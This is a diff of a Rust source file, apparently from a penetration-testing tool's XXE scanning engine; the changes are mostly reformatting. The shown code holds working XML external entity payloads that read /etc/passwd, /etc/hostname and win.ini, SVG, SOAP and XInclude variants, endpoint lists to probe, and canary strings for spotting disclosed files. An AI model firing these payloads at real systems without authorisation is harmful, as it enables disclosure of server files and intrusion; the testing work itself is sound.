@@ -1,8 +1,8 @@
 //! XXE Engine — XML surface discovery, in-band disclosure, error-based, alternate vectors.
 //! MITRE: T1190 (Exploit Public-Facing Application).
 
-use crate::engine_probes::{empty_ok, finding_with_probe_depth, http_client, normalize_url};
 use crate::engine_dispatch::EngineRunContext;
+use crate::engine_probes::{empty_ok, finding_with_probe_depth, http_client, normalize_url};
 use crate::engine_result::{print_result, EngineResult};
 use crate::pentest_memory;
 use serde_json::{json, Value};
@@ -75,19 +75,45 @@ const XXE_PASSWD: &str = r#"<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test
 const XXE_HOSTNAME: &str = r#"<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><r>&xxe;</r>"#;
 const XXE_WININI: &str = r#"<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><test>&xxe;</test>"#;
 const XXE_ERROR: &str = r#"<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % xxe SYSTEM "file:///nonexistent-wz-xxe-9137">%xxe;]><r/>"#;
-const XXE_ENTITY_CAP: &str = r#"<?xml version="1.0"?><!DOCTYPE r [<!ENTITY a "x"><!ENTITY b "&a;&a;&a;">]><r>&b;</r>"#;
+const XXE_ENTITY_CAP: &str =
+    r#"<?xml version="1.0"?><!DOCTYPE r [<!ENTITY a "x"><!ENTITY b "&a;&a;&a;">]><r>&b;</r>"#;
 const XXE_SVG: &str = r#"<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>"#;
 const XXE_SOAP: &str = r#"<?xml version="1.0"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><soap:Body><foo>&xxe;</foo></soap:Body></soap:Envelope>"#;
 const XXE_XINCLUDE: &str = r#"<?xml version="1.0"?><r xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/hostname"/></r>"#;
 
-const PASSWD_CANARIES: &[&str] = &["root:x:0:0", "root:*:0:0", "/bin/bash", "/bin/sh", "daemon:"];
+const PASSWD_CANARIES: &[&str] = &[
+    "root:x:0:0",
+    "root:*:0:0",
+    "/bin/bash",
+    "/bin/sh",
+    "daemon:",
+];
 const HOSTNAME_CANARIES: &[&str] = &["localhost", ".local", ".internal"];
 const WININI_CANARIES: &[&str] = &["[fonts]", "[extensions]", "for 16-bit app support"];
-const ERROR_CANARIES: &[&str] = &["file:///", "system cannot find", "no such file", "failed to open", "entity", "external entity"];
+const ERROR_CANARIES: &[&str] = &[
+    "file:///",
+    "system cannot find",
+    "no such file",
+    "failed to open",
+    "entity",
+    "external entity",
+];
 
 const XML_PATHS: &[&str] = &[
-    "/", "/api", "/api/v1", "/xml", "/upload", "/import", "/soap", "/service", "/ws",
-    "/api/import", "/api/xml", "/api/upload", "/rpc", "/wsdl",
+    "/",
+    "/api",
+    "/api/v1",
+    "/xml",
+    "/upload",
+    "/import",
+    "/soap",
+    "/service",
+    "/ws",
+    "/api/import",
+    "/api/xml",
+    "/api/upload",
+    "/rpc",
+    "/wsdl",
 ];
 
 const CONTENT_TYPES: &[&str] = &[
@@ -176,12 +202,48 @@ pub async fn run_xxe_result(target: &str) -> EngineResult {
         ));
 
         let probes: &[(&str, &str, &[&str], &str, &str)] = &[
-            (XXE_PASSWD, "critical", PASSWD_CANARIES, "/etc/passwd", "passwd-read"),
-            (XXE_HOSTNAME, "critical", HOSTNAME_CANARIES, "/etc/hostname", "hostname-read"),
-            (XXE_WININI, "critical", WININI_CANARIES, "win.ini", "winini-read"),
-            (XXE_SVG, "high", HOSTNAME_CANARIES, "/etc/hostname", "svg-xxe"),
-            (XXE_SOAP, "high", HOSTNAME_CANARIES, "/etc/hostname", "soap-xxe"),
-            (XXE_XINCLUDE, "high", HOSTNAME_CANARIES, "/etc/hostname", "xinclude-read"),
+            (
+                XXE_PASSWD,
+                "critical",
+                PASSWD_CANARIES,
+                "/etc/passwd",
+                "passwd-read",
+            ),
+            (
+                XXE_HOSTNAME,
+                "critical",
+                HOSTNAME_CANARIES,
+                "/etc/hostname",
+                "hostname-read",
+            ),
+            (
+                XXE_WININI,
+                "critical",
+                WININI_CANARIES,
+                "win.ini",
+                "winini-read",
+            ),
+            (
+                XXE_SVG,
+                "high",
+                HOSTNAME_CANARIES,
+                "/etc/hostname",
+                "svg-xxe",
+            ),
+            (
+                XXE_SOAP,
+                "high",
+                HOSTNAME_CANARIES,
+                "/etc/hostname",
+                "soap-xxe",
+            ),
+            (
+                XXE_XINCLUDE,
+                "high",
+                HOSTNAME_CANARIES,
+                "/etc/hostname",
+                "xinclude-read",
+            ),
         ];
 
         for (payload, sev, canaries, marker, label) in probes {
@@ -206,7 +268,9 @@ pub async fn run_xxe_result(target: &str) -> EngineResult {
 
         if let Some(err) = http_post_body(&client, &url, "application/xml", XXE_ERROR).await {
             let lc = err.body.to_ascii_lowercase();
-            if ERROR_CANARIES.iter().any(|c| lc.contains(&c.to_ascii_lowercase()))
+            if ERROR_CANARIES
+                .iter()
+                .any(|c| lc.contains(&c.to_ascii_lowercase()))
                 && !err.body.contains("nonexistent-wz-xxe-9137")
             {
                 findings.push(xxe_finding(
@@ -257,7 +321,10 @@ pub async fn run_xxe_result(target: &str) -> EngineResult {
             }
         }
 
-        if findings.iter().any(|f| f.get("severity").and_then(|s| s.as_str()) == Some("critical")) {
+        if findings
+            .iter()
+            .any(|f| f.get("severity").and_then(|s| s.as_str()) == Some("critical"))
+        {
             break;
         }
     }
@@ -280,7 +347,15 @@ mod tests {
 
     #[test]
     fn file_disclosed_detects_passwd() {
-        assert!(file_disclosed("root:x:0:0:root", PASSWD_CANARIES, "/etc/passwd"));
-        assert!(!file_disclosed("file:///etc/passwd", PASSWD_CANARIES, "/etc/passwd"));
+        assert!(file_disclosed(
+            "root:x:0:0:root",
+            PASSWD_CANARIES,
+            "/etc/passwd"
+        ));
+        assert!(!file_disclosed(
+            "file:///etc/passwd",
+            PASSWD_CANARIES,
+            "/etc/passwd"
+        ));
     }
 }
